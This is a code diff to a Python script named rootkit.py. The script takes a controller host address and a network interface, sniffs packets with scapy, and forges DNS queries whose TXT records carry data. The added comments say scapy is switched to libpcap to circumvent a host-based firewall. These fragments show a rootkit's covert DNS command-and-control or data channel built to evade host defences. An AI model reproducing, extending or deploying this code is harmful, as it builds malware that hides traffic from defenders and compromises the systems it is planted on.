@@ -26,10 +26,12 @@ from scapy.all import sniff, UDP, DNSQR, DNSRR, IP, DNS, send, conf
 
 PARSER = argparse.ArgumentParser("./rootkit.py")
 PARSER.add_argument("controller_ip", help="The IPv4 address of the controller host.")
-# PARSER.add_argument("rootkit_ip", help="The IPv4 address of the rootkit host.")
 PARSER.add_argument("interface", help="The name of the Network Interface Device to listen on. i.e. wlo1, enp2s0, enp1s0")
 ARGS = PARSER.parse_args()
 
+
+# Manually set scapy to use libpcap instead of bpkfilter.
+# This is necessary to circumvent host-based firewall.
 conf.use_pcap = True
 
 
@@ -96,7 +98,6 @@ def forge_dns_query(data: str):
     """
     hostname = get_random_hostname()
     encrypted_data = b""
-    # encrypted_data = ENCRYPTION_HANDLER.encrypt(data.encode("utf-8"))
     if len(data) > 255:
         print("ERROR: Can't fit more than 256 bytes in TXT record!")
         print("Truncating data...")
